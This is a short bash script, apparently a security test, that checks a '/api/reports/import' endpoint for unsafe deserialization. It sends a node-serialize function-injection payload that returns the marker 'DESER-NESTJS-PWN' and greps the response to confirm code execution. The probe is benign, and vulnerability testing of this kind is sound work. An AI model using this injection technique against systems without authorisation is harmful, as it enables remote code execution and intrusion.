#!/usr/bin/env bash
set -euo pipefail
source "$(dirname "$0")/_lib.sh"
payload="_\$\$ND_FUNC\$\$_function(){return 'DESER-NESTJS-PWN'}()"
json=$(python3 -c 'import json,sys; print(json.dumps({"state": sys.argv[1]}))' "$payload")
body=$(curl -s -X POST "$TARGET/api/reports/import" -H 'content-type: application/json' --data-binary "$json")
grep -q 'DESER-NESTJS-PWN' <<<"$body"
